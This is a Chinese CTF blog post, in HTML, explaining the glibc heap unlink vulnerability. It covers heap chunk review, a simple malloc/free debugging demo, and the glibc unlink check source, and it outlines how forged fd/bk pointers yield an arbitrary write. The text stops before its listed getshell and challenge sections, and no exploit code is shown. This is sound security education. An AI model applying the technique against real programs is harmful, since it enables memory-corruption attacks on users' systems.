@@ -1,0 +1,665 @@
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_ex15nbittbh';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://idcm-svg.github.io/HFTTC.github.io';window.REIMU_CONFIG.relative = '/HFTTC.github.io/';</script>
+  <title>
+    index | SEZUVEM=&#39;s Blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_ex15nbittbh.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/HFTTC.github.io/css/loader.css">
+
+    <meta name="description" content="Unlink漏洞原理及利用（Unsortedbin）什么是unlink？unlink 俗称脱链，就是将链表头处的 free 堆块 unsorted bin中脱离出来，然后和物理地址相邻的新 free的堆块合并成大堆块（向前合并或者向后合并）再放入unsorted bin中。 危害原理：通过伪造free状态的fake_chunk，伪造fd指针和bk指针，通过绕过unlink的检查实现unlink，u">
+<meta property="og:type" content="article">
+<meta property="og:title" content="index">
+<meta property="og:url" content="https://idcm-svg.github.io/HFTTC.github.io/2026/04/28/PWN/PWNCTF/Unlink%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8%EF%BC%88Unsortedbin%EF%BC%89/index/index.html">
+<meta property="og:site_name" content="SEZUVEM&#x3D;&#39;s Blog">
+<meta property="og:description" content="Unlink漏洞原理及利用（Unsortedbin）什么是unlink？unlink 俗称脱链，就是将链表头处的 free 堆块 unsorted bin中脱离出来，然后和物理地址相邻的新 free的堆块合并成大堆块（向前合并或者向后合并）再放入unsorted bin中。 危害原理：通过伪造free状态的fake_chunk，伪造fd指针和bk指针，通过绕过unlink的检查实现unlink，u">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/73098186_O5B8gtwQa8f7608U/1767166954029-ecb50b8b-b118-4779-bcbc-920e5c052b72-306909.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/73098186_O5B8gtwQa8f7608U/1767166999426-b601f60d-a97a-48de-9b39-8681732f6979-755895.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/73098186_O5B8gtwQa8f7608U/1767167120158-83ac74fd-e2f8-4241-bb92-bb2cb118b2e5-070607.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/73098186_O5B8gtwQa8f7608U/1767167139961-0daaaf13-3fc4-4e11-94b8-8fdea2111ab7-804782.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/73098186_O5B8gtwQa8f7608U/1767169066230-a0b7d623-1931-4ed9-bbbb-17ae33a64941-316223.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/73098186_O5B8gtwQa8f7608U/1767170135894-c2a638fd-627a-433d-8991-386c86a2e085-408308.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/73098186_O5B8gtwQa8f7608U/1767171132630-0fd3ff2e-9fdc-4da6-8e11-8042c8751271-914377.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/73098186_O5B8gtwQa8f7608U/1767171172839-baeae728-9872-4476-962d-9271e7080dd3-689315.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/73098186_O5B8gtwQa8f7608U/1767171254938-ae500dc5-9bf9-4166-9fa8-82746491ddbf-879756.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/73098186_O5B8gtwQa8f7608U/1767171367504-88dbcb2a-cd53-4327-9f21-10b63aeb8a86-696143.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/73098186_O5B8gtwQa8f7608U/1767171992496-74b04625-5aee-496e-9cf7-45052291b8af-698738.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/73098186_O5B8gtwQa8f7608U/1767172495400-ab9f7a71-231e-4367-8931-8f6d87c9127e-805643.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/73098186_O5B8gtwQa8f7608U/1767173010527-67b29573-f7e4-4c6b-ab8a-0965316ad281-184409.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/73098186_O5B8gtwQa8f7608U/1767173151507-e3573d6b-4aec-4241-a77b-331449cee00f-333874.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/73098186_O5B8gtwQa8f7608U/1767188475648-3c47ce38-992a-46b7-a008-afca5ce6e122-413458.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/73098186_O5B8gtwQa8f7608U/1767202086802-bcd78259-b27b-4bc9-8f23-791f08df5522-181856.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/73098186_O5B8gtwQa8f7608U/1767201576247-22e27a51-853a-4226-b32d-d1717e37480f-712920.png">
+<meta property="article:published_time" content="2026-04-28T10:25:58.483Z">
+<meta property="article:modified_time" content="2026-04-28T11:19:30.417Z">
+<meta property="article:author" content="SEZUVEM&#x3D;">
+<meta property="article:tag" content="Pwn, CTF, Binary">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/73098186_O5B8gtwQa8f7608U/1767166954029-ecb50b8b-b118-4779-bcbc-920e5c052b72-306909.png">
+      <meta name="keywords" content="Pwn, CTF, Binary">
+    <link rel="alternate" href="/HFTTC.github.io/atom.xml" title="SEZUVEM='s Blog" type="application/atom+xml">
+    <link rel="shortcut icon" href="/HFTTC.github.io/images/favicon.ico">
+  
+<link rel="stylesheet" href="/HFTTC.github.io/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">首页</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/archives">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">归档</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/about">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">关于</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/friend">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">友链</span>
+        </a>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/HFTTC.github.io/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+        <picture>
+        </picture>
+          <img  fetchpriority="high" src="/HFTTC.github.io/images/banner.webp" alt="index">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">index</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Unlink%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8%EF%BC%88Unsortedbin%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">Unlink漏洞原理及利用（Unsortedbin）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFunlink%EF%BC%9F"><span class="toc-number">1.1.</span> <span class="toc-text">什么是unlink？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%A4%8D%E4%B9%A0"><span class="toc-number">1.2.</span> <span class="toc-text">堆复习</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E5%AE%9E%E4%BE%8B%E4%BB%8B%E7%BB%8Dunlink"><span class="toc-number">1.3.</span> <span class="toc-text">通过实例介绍unlink</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E4%BA%86%E8%A7%A3free%E5%90%8Ebin%E7%9A%84%E5%AD%98%E6%94%BE"><span class="toc-number">1.3.1.</span> <span class="toc-text">简单了解free后bin的存放</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#unlink%E7%9A%84%E6%A3%80%E6%9F%A5%E8%BF%87%E7%A8%8B"><span class="toc-number">1.3.2.</span> <span class="toc-text">unlink的检查过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#unlink-getshell%E7%9A%84%E8%BF%87%E7%A8%8B%E4%B8%8E%E5%AE%9E%E7%8E%B0"><span class="toc-number">1.3.3.</span> <span class="toc-text">unlink getshell的过程与实现</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#tip%EF%BC%89glibc%E5%A6%82%E4%BD%95%E8%AF%86%E5%88%ABchunk"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">tip）glibc如何识别chunk</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#unlink%E6%AC%BA%E9%AA%97glibc%E8%BF%87%E7%A8%8B"><span class="toc-number">1.3.3.2.</span> <span class="toc-text">unlink欺骗glibc过程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E6%9C%AC%E8%B4%A8%E6%80%BB%E7%BB%93"><span class="toc-number">1.3.3.3.</span> <span class="toc-text">核心本质总结</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hitconTraining-unlink"><span class="toc-number">1.4.</span> <span class="toc-text">hitconTraining_unlink</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF"><span class="toc-number">1.4.1.</span> <span class="toc-text">基本思路</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="SEZUVEM=" class="lazyload">
+  <div class="sidebar-author-name">SEZUVEM=</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">198</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-PWN/PWNCTF/Unlink漏洞原理及利用（Unsortedbin）/index" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-04-28T10:25:58.483Z" itemprop="datePublished">2026-04-28</time>
+    <time style="display: none;" id="post-update-time">2026-04-28</time>
+  </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h1 id="Unlink漏洞原理及利用（Unsortedbin）"><a href="#Unlink漏洞原理及利用（Unsortedbin）" class="headerlink" title="Unlink漏洞原理及利用（Unsortedbin）"></a>Unlink漏洞原理及利用（Unsortedbin）</h1><h3 id="什么是unlink？"><a href="#什么是unlink？" class="headerlink" title="什么是unlink？"></a>什么是unlink？</h3><p>unlink 俗称脱链，就是将链表头处的 free 堆块 unsorted bin中脱离出来，然后和物理地址相邻的新 free的堆块合并成大堆块（向前合并或者向后合并）再放入unsorted bin中。</p>
+<p>危害原理：通过伪造free状态的fake_chunk，伪造fd指针和bk指针，通过绕过unlink的检查实现unlink，unlink就会往p所在的位置写入p-0x18，从而实现任意地址写的漏洞。</p>
+<p>漏洞产生原因：offbynull，offbyone，堆溢出修改了堆块的标志位</p>
+<p>我们所称的unlink其实就是在双向链表中取出一个chunk的操作，那么什么时候会用到unlink呢？</p>
+<p><strong>1）malloc</strong></p>
+<ul>
+<li><strong>在恰好大小的large chunk处取chunk时</strong></li>
+<li><strong>在比请求大小大的bin中取chunk时</strong></li>
+</ul>
+<p><strong>2）free</strong></p>
+<ul>
+<li><strong>后向合并，合并物理相邻低物理地址空闲chunk时</strong></li>
+<li><strong>前向合并，合并物理相邻高物理地址空闲chunk时（top chunk除外）</strong></li>
+</ul>
+<p><strong>3）malloc_consolidate</strong></p>
+<ul>
+<li><strong>后向合并，合并物理相邻低地址空闲chunk时。</strong></li>
+<li><strong>前向合并，合并物理相邻高地址空闲chunk时（top chunk除外）</strong></li>
+</ul>
+<p><strong>4）realloc</strong></p>
+<ul>
+<li><strong>前向扩展，合并物理相邻高地址空闲chunk（top chunk除外）</strong></li>
+</ul>
+<h3 id="堆复习"><a href="#堆复习" class="headerlink" title="堆复习"></a>堆复习</h3><p>在学习unlink之前再复习一下堆<img src="/HFTTC.github.io/./img/73098186_O5B8gtwQa8f7608U/1767166954029-ecb50b8b-b118-4779-bcbc-920e5c052b72-306909.png" alt="1767166954029-ecb50b8b-b118-4779-bcbc-920e5c052b72.png"><img src="/HFTTC.github.io/./img/73098186_O5B8gtwQa8f7608U/1767166999426-b601f60d-a97a-48de-9b39-8681732f6979-755895.png" alt="1767166999426-b601f60d-a97a-48de-9b39-8681732f6979.png">我们之前学习到，P&#x3D;1表示物理相邻的前一个堆块正在被使用，当P&#x3D;0时两个堆块就会合并成一个大堆块，并放在unsorted bin这个链表中<img src="/HFTTC.github.io/./img/73098186_O5B8gtwQa8f7608U/1767167120158-83ac74fd-e2f8-4241-bb92-bb2cb118b2e5-070607.png" alt="1767167120158-83ac74fd-e2f8-4241-bb92-bb2cb118b2e5.png"><img src="/HFTTC.github.io/./img/73098186_O5B8gtwQa8f7608U/1767167139961-0daaaf13-3fc4-4e11-94b8-8fdea2111ab7-804782.png" alt="1767167139961-0daaaf13-3fc4-4e11-94b8-8fdea2111ab7.png"></p>
+<ul>
+<li><font style="color:rgb(76, 73, 72);">下面用图介绍一下</font><code><font style="color:rgb(244, 116, 102);background-color:rgba(27, 31, 35, 0.05);">main_arena</font></code><font style="color:rgb(76, 73, 72);">并给出一些在本题中比较重要的一些东西：</font><ul>
+<li><font style="color:rgb(76, 73, 72);">unlink过程主要脱的是bins中管理的堆块链表</font></li>
+<li><font style="color:rgb(76, 73, 72);">当unlink结束后新合成的堆块会与top_chunk的地址相连还会与top_chunk合并</font></li>
+</ul>
+</li>
+</ul>
+<font style="color:rgb(73, 177, 245);">  
+</font>![1767167248026-75a24bcc-aacc-4388-b56d-8a4db9b54076.png](./img/73098186_O5B8gtwQa8f7608U/1767167248026-75a24bcc-aacc-4388-b56d-8a4db9b54076-458913.png)
+
+<h3 id="通过实例介绍unlink"><a href="#通过实例介绍unlink" class="headerlink" title="通过实例介绍unlink"></a>通过实例介绍unlink</h3><h4 id="简单了解free后bin的存放"><a href="#简单了解free后bin的存放" class="headerlink" title="简单了解free后bin的存放"></a>简单了解free后bin的存放</h4><ul>
+<li>对下面的程序进行动态调试，并思考以下问题</li>
+<li>1）申请的堆块释放后会被哪个bins管理？2）p1和p2会发生合并吗？3）p2和p3会发生合并吗？</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> a[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *pp = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta"># gcc -o unlink_64 unlink_64.c -fno-stack-protector -z execstack</span></span><br></pre></td></tr></table></figure>
+
+<p>程序进行编译之后用gdb进行调试并ni单步执行到&lt;main+64&gt;</p>
+<p><img src="/HFTTC.github.io/./img/73098186_O5B8gtwQa8f7608U/1767169066230-a0b7d623-1931-4ed9-bbbb-17ae33a64941-316223.png" alt="1767169066230-a0b7d623-1931-4ed9-bbbb-17ae33a64941.png">用heap指令查看堆块，<font style="color:rgb(0, 0, 0);">直接看堆块的前缀标识</font></p>
+<ul>
+<li><strong><font style="color:rgb(0, 0, 0);">Allocated chunk</font></strong><font style="color:rgb(0, 0, 0);">：表示这个堆块是</font><strong><font style="color:rgb(0, 0, 0) !important;">正在被使用</font></strong><font style="color:rgb(0, 0, 0);">的（已分配，未被 free）；</font></li>
+<li><strong><font style="color:rgb(0, 0, 0);">Top chunk</font></strong><font style="color:rgb(0, 0, 0);">：是堆的 “顶部空闲块”，属于</font><strong><font style="color:rgb(0, 0, 0) !important;">空闲状态</font></strong><font style="color:rgb(0, 0, 0);">（未被分配，用于后续 malloc 扩展）。</font></li>
+</ul>
+<p>发现一共申请了四个堆块并且四个堆块都在使用中<img src="/HFTTC.github.io/./img/73098186_O5B8gtwQa8f7608U/1767170135894-c2a638fd-627a-433d-8991-386c86a2e085-408308.png" alt="1767170135894-c2a638fd-627a-433d-8991-386c86a2e085.png"></p>
+<p>再次单步执行到第一个free之后，第二个free之前看一看堆块情况</p>
+<p>发现第一次被释放的chunk0被归入到了unsortedbin<img src="/HFTTC.github.io/./img/73098186_O5B8gtwQa8f7608U/1767171132630-0fd3ff2e-9fdc-4da6-8e11-8042c8751271-914377.png" alt="1767171132630-0fd3ff2e-9fdc-4da6-8e11-8042c8751271.png">再次执行到第二个free之后第三个free之前看一看堆块的情况</p>
+<p>发现第二个chunk也被放入了unsortedbins</p>
+<p><img src="/HFTTC.github.io/./img/73098186_O5B8gtwQa8f7608U/1767171172839-baeae728-9872-4476-962d-9271e7080dd3-689315.png" alt="1767171172839-baeae728-9872-4476-962d-9271e7080dd3.png">查看unsortedbin发现bin上有两个链条且没有合并，按照后进先出的原则<img src="/HFTTC.github.io/./img/73098186_O5B8gtwQa8f7608U/1767171254938-ae500dc5-9bf9-4166-9fa8-82746491ddbf-879756.png" alt="1767171254938-ae500dc5-9bf9-4166-9fa8-82746491ddbf.png">看一下第三次free之后的情况，发现后两个堆块被合并到Top chunk中，topchunk的addr也发生变化<img src="/HFTTC.github.io/./img/73098186_O5B8gtwQa8f7608U/1767171367504-88dbcb2a-cd53-4327-9f21-10b63aeb8a86-696143.png" alt="1767171367504-88dbcb2a-cd53-4327-9f21-10b63aeb8a86.png">因此这些堆块释放后都会被unsortedbin管理</p>
+<p>p1与p2两个指针的堆块是不会合并的，并且只有物理地址相邻且空闲的堆块会被合并</p>
+<p>p2与p3这两个指针指向的堆块是会合并的</p>
+<h4 id="unlink的检查过程"><a href="#unlink的检查过程" class="headerlink" title="unlink的检查过程"></a>unlink的检查过程</h4><p>通过分析glibc源码，并使用图描述unlink的过程，具体了解unlink的检查过程</p>
+<p>在<a target="_blank" rel="noopener" href="http://ftp.gnu.org/gnu/glibc/%E4%B8%8B%E8%BD%BDgilbc-2.23.tar.xz%E6%96%87%E4%BB%B6%EF%BC%8C%E6%9D%A5%E5%88%B0malloc%E6%96%87%E4%BB%B6%E5%A4%B9%E4%B8%AD%E7%9A%84malloc.c">http://ftp.gnu.org/gnu/glibc/下载gilbc-2.23.tar.xz文件，来到malloc文件夹中的malloc.c</a></p>
+<p>这里直接给代码放出来<img src="/HFTTC.github.io/./img/73098186_O5B8gtwQa8f7608U/1767171992496-74b04625-5aee-496e-9cf7-45052291b8af-698738.png" alt="1767171992496-74b04625-5aee-496e-9cf7-45052291b8af.png">我们这里简单了解前八行的内容：</p>
+<p>在unlink中只是进行了脱链的操作，并没有修改堆块的size位，而堆块的size位是在malloc_consolidate这个函数中所修改的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">define <span class="title function_">unlink</span><span class="params">(AV, P, BK, FD)</span> &#123;                                            \</span><br><span class="line">    FD = P-&gt;fd;								      \</span><br><span class="line">    BK = P-&gt;bk;								      \</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))	<span class="comment">//0或非0，对应true，false	      \</span></span><br><span class="line"><span class="comment">      malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);  \</span></span><br><span class="line"><span class="comment">    else &#123;								      \1</span></span><br><span class="line">        FD-&gt;bk = BK;							      \</span><br><span class="line">        BK-&gt;fd = FD;							      </span><br></pre></td></tr></table></figure>
+
+<p>**tip）**unlink的过程是指 chunk加入unsortedbin之前进行的，所以他们的fd、bk指针都是根据物理地址的高低来指向的</p>
+<ul>
+<li><strong>fd 指向当前chunk的下一个空闲块，通常是物理内存地址较高的那个块</strong></li>
+<li><strong>bk指向当前chunk的上一个空闲块，通常是物理内存地址较低的那个块</strong></li>
+<li><strong>当前chunk的指针fd&amp;bk会被设置成NULL，表示没有后续和前面的空闲块</strong></li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD = P-&gt;fd</span><br><span class="line">BK = P-&gt;bk</span><br></pre></td></tr></table></figure>
+
+<p><img src="/HFTTC.github.io/./img/73098186_O5B8gtwQa8f7608U/1767172495400-ab9f7a71-231e-4367-8931-8f6d87c9127e-805643.png" alt="1767172495400-ab9f7a71-231e-4367-8931-8f6d87c9127e.png"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD-&gt;bk = BK;							      </span><br><span class="line">BK-&gt;fd = FD;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/HFTTC.github.io/./img/73098186_O5B8gtwQa8f7608U/1767173010527-67b29573-f7e4-4c6b-ab8a-0965316ad281-184409.png" alt="1767173010527-67b29573-f7e4-4c6b-ab8a-0965316ad281.png">大概了解了脱链的一个步骤，我们再来看一看判断条件的代码</p>
